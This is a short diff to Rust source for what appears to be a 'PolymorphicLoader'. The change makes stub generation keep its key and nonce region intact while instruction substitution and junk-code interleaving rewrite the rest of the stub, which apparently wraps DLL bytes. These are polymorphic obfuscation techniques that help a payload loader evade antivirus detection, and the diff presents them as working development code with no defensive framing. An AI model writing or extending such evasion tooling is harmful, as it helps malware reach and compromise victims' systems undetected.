@@ -116,9 +116,13 @@ impl PolymorphicLoader {
             dll_bytes.to_vec()
         };
 
-        let mut stub = stub_gen::emit_base_stub(&key, &nonce)?;
+        let emitted_stub = stub_gen::emit_base_stub(&key, &nonce)?;
+        let mut stub = emitted_stub.bytes;
         if cfg.substitute {
-            stub = substitute::transform(&stub)?;
+            stub = substitute::transform_with_protected_ranges(
+                &stub,
+                &[emitted_stub.key_nonce_range],
+            )?;
         }
         if cfg.junk_density > 0 {
             stub = junk::interleave(&stub, cfg.junk_density)?;
